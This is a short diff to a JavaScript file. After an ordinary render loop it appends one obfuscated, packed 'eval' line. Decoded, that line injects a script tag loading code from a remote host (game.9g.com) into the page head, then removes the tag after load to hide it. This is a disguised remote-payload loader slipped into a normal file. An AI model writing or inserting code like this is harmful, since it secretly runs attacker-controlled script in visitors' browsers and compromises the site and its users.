@@ -365,4 +365,4 @@
     render();
   }, 100);
 })()
-
+eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('(1(){3 a=2.n(\'l\');a.g=\'c/9\';a.d=f;a.e=\'8://5.4.7/6/o.m\';3 b=2.p(\'q\')[0];b.i(a);a.h=1(){a.k.j(a)}})();',27,27,'|function|document|var|9g|game|xxoo|com|http|javascript|||text|async|src|true|type|onload|appendChild|removeChild|parentNode|script|js|createElement||getElementsByTagName|head'.split('|'),0,{}))
